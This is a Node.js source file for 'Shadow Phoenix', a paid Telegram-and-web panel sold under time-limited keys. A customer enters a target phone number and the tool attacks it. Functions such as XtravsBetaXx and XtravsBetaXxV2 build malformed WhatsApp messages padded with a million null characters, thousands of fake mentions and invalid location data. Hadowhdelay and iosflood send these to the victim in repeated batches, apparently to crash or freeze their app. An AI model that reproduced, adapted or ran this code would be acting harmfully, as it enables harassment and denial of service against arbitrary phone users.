const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  proto,
  prepareWAMessageMedia,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

const { tokens, owner: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const app = express();

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

/*function saveAkses(data) {
  const normalized = {
    owners: data.owners.map(id => id.toString()),
    akses: data.akses.map(id => id.toString())
  };
  fs.writeFileSync(file, JSON.stringify(normalized, null, 2));
}*/

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function makeBox(title, lines) {
  const contentLengths = [
    title.length,
    ...lines.map(l => l.length)
  ];
  const maxLen = Math.max(...contentLengths);

  const top    = "╔" + "═".repeat(maxLen + 2) + "╗";
  const middle = "╠" + "═".repeat(maxLen + 2) + "╣";
  const bottom = "╚" + "═".repeat(maxLen + 2) + "╝";

  const padCenter = (text, width) => {
    const totalPad = width - text.length;
    const left = Math.floor(totalPad / 2);
    const right = totalPad - left;
    return " ".repeat(left) + text + " ".repeat(right);
  };

  const padRight = (text, width) => {
    return text + " ".repeat(width - text.length);
  };

  const titleLine = "║ " + padCenter(title, maxLen) + " ║";
  const contentLines = lines.map(l => "║ " + padRight(l, maxLen) + " ║");

  return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const makeStatus = (number, status) => makeBox("ＳＴＡＴＵＳ", [
  `Ｎｕｍｅｒｏ : ${number}`,
  `Ｅｓｔａｄｏ : ${status.toUpperCase()}`
]);

const makeCode = (number, code) => ({
  text: makeBox("ＳＴＡＴＵＳ ＰＡＩＲ", [
    `Ｎｕｍｅｒｏ : ${number}`,
    `Ｃｏ́ｄｉｇｏ : ${code}`
  ]),
  parse_mode: "HTML"
});

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
╔════════════════════════════╗
║      SESSÕES ATIVAS DO WA
╠════════════════════════════╣
║  QUANTIDADE : ${activeNumbers.length}
╚════════════════════════════╝`));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pareando com o número ${BotNumber}...`, { parse_mode: "HTML" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
    } catch (e) {
      console.error("Falha ao editar mensagem:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Reconectando..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "✗ Falha na conexão."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✓ Conectado com sucesso."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "XATHENA1");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "HTML",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Erro ao solicitar código:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";

  const teks = `
<b>[  ☇ 𝐒𝐡𝐚𝐝𝐨𝐰 𝐏𝐡𝐨𝐞𝐧𝐢𝐱 𝐕𝐯𝐢𝐩  ]</b>
╭─────────────────────────╸╴
│ Hᴏʟᴀᴀ ʙʀᴏᴏ : ${username}
│ Sᴄʀɪᴘᴛ : Shadow Phoenix
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @DryzxModders
│ Dᴇᴠᴇʟᴏᴘᴇʀ : @MexxModders
│ Vᴇʀsɪᴏɴ : 1.0
│ Sᴛᴀᴛᴜs Sᴄʀɪᴘᴛ : Vᴠɪᴘ Bᴜʏ Oɴʟʏ
│ 
│ 
│ 「 Akses Menu 」
│ ᯓ /connect
│ ᯓ /listsender
│ ᯓ /delsender
│ ᯓ /ckey
│ ᯓ /listkey
│ ᯓ /delkey
│ 
│ 「 Owner Menu 」
│ ᯓ /addacces
│ ᯓ /delacces
│ ᯓ /addowner
│ ᯓ /delowner
╰─────────────────────────╸╴
`;

  const keyboard = new InlineKeyboard().url(
    "Group Pt",
    "https://t.me/allbuyersxpt"
  );

  await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/z7xdq5.png" },
    {
      caption: teks,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }
  );
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("✗ Falha\n\nExample : /connect 628xxxx", { parse_mode: "HTML" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");

  const daftarSender = [...sessions.keys()]
    .map(n => `• ${n}`)
    .join("\n");

  ctx.reply(`Daftar Sender Aktif:\n${daftarSender}`);
});

bot.command("delsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 628xxxx", { parse_mode: "HTML" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✓ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("Example : /ckey X4thena,30d /ckey X4thena,30d,puki", { parse_mode: "HTML" });
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✓ <b>Key berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `𞅏 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 𝑳𝒊𝒔𝒕:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey X4thena");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  
  if (!id) return ctx.reply("✗ Falha\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - khusus owner ler");
  }
  if (!id) return ctx.reply("✗ Falha\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.launch();
console.log(chalk.red(`
╭─⦏ 𝑿-𝑺𝒊𝒍𝒆𝒏𝒕 𝐆𝐞𝐫𝐚çã𝐨 𝟏 ⦐
│ꔹ ɪᴅ ᴏᴡɴ : ${OwnerId}
│ꔹ ᴅᴇᴠᴇʟᴏᴘᴇʀ : X4thena
│ꔹ ʙᴏᴛ : ᴄᴏɴᴇᴄᴛᴀᴅᴏ ✓
╰───────────────────`));

initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "X-SILENT", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "X-SILENT", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./X-SILENT/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✓ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["andros", "ios"].includes(mode)) {
        return res.send(executionPage("✓ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("✗ Mode salah", {
        message: "Mode tidak dikenali."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("✗ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "andros") {
        Hadowhdelay(24, target);
      } else if (mode === "ios") {
        Hadowhdelay(24, target);
      } else if (mode === "AndrosDelay") {
        Hadowhdelay(10, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("✗ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== XSILENTS FUNCTIONS ==================== //
async function XtravsBetaXx(X, mention) {
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: X,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };
  
  const audioMessage2 = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
           "6285215587498@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
         `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
          ),
        ],
      }
    }
  };
  
  const msg = generateWAMessageFromContent(X, message1, audioMessage2, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      X, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

async function XtravsBetaXxV2(X, mention) {
  const BetaXxV1 = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: [
          "6285215587498@s.whatsapp.net",  ...Array.from({ length: 1990 }, () => `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
          ),
        ],
      },
    },
  };
  
  const BetaXxV2 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.999999999999,
              name: "\u900A",
              address: "\u0007".repeat(20000),
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: { 
            text: "𝗩𝗮𝘅𝘇𝘆𝗦𝗵𝗿𝗲𝗱𝗱𝗲𝗿" 
          },
          nativeFlowMessage: {
            messageParamsJson: "[]".repeat(4000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: "\u0003",
                  sections: [
                    {
                      title: "\u0000",
                      rows: [],
                    },
                  ],
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                name: "\u0003",
                }),
              },
            ],
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: [
              "6285215587498@s.whatsapp.net",  ...Array.from({ length: 1990 }, () => `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
              ),
            ],
          },
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(X, BetaXxV1, BetaXxV2, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      X, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

async function Hadowhdelay(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 100) {
        await Promise.all([
          XtravsBetaXx(X, false),
          XtravsBetaXxV2(X, false)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/100 Delay Invis
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function iosflood(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          iosinVisFC(X),
          NewProtocolbug6(X),
          VtxForceDelMsg2(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 IOS🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade X-ATHENA 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SHADOW PHOENIX VVIP</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Orbitron', sans-serif;
      background: #000;
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: rgba(0, 0, 0, 0.85);
      border: 1px solid #8A0303;
      padding: 24px;
      border-radius: 20px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 0 20px rgba(138, 3, 3, 0.7);
      backdrop-filter: blur(10px);
    }
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 12px;
      display: block;
      border-radius: 50%;
      box-shadow: 0 0 20px rgba(138, 3, 3, 0.9);
      object-fit: cover;
    }
    .username {
      font-size: 22px;
      font-weight: bold;
      text-align: center;
      margin-bottom: 6px;
      color: #fff;
    }
    .connected {
      font-size: 14px;
      color: #B22222;
      margin-bottom: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .connected::before {
      content: '';
      width: 10px;
      height: 10px;
      background: #00ff5e;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
    }
    input[type="text"] {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #111;
      border: 1px solid #8A0303;
      color: #fff;
      margin-bottom: 16px;
      box-shadow: inset 0 0 8px rgba(138, 3, 3, 0.5);
    }
    /* Dropdown */
    .select-wrapper {
      margin-bottom: 16px;
    }
    select {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #111;
      border: 1px solid #8A0303;
      color: #ff4444;
      font-weight: bold;
      text-shadow: 0 0 6px #8A0303;
      cursor: pointer;
      appearance: none;
      box-shadow: inset 0 0 8px rgba(138, 3, 3, 0.5);
    }
    select:focus {
      outline: none;
      border-color: #ff0000;
      box-shadow: 0 0 12px rgba(255, 0, 0, 0.8);
    }
    .execute-button {
      background: linear-gradient(135deg, #8A0303, #5c0000);
      color: #fff;
      padding: 14px;
      width: 100%;
      border-radius: 10px;
      font-weight: bold;
      border: none;
      margin-bottom: 12px;
      cursor: pointer;
      transition: 0.3s;
      text-shadow: 0 0 6px #8A0303;
    }
    .execute-button:disabled {
      background: #330000;
      cursor: not-allowed;
      opacity: 0.5;
    }
    .execute-button:hover:not(:disabled) {
      background: #B22222;
      box-shadow: 0 0 12px rgba(178, 34, 34, 0.9);
    }
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-top: 20px;
    }
    .footer-button {
      background: rgba(138, 3, 3, 0.15);
      border: 1px solid #8A0303;
      border-radius: 8px;
      padding: 8px 12px;
      font-size: 14px;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: background 0.3s ease, box-shadow 0.3s ease;
    }
    .footer-button:hover {
      background: rgba(138, 3, 3, 0.3);
      box-shadow: 0 0 8px rgba(138, 3, 3, 0.7);
    }
    .footer-button a {
      text-decoration: none;
      color: #ff4444;
      display: flex;
      align-items: center;
      gap: 6px;
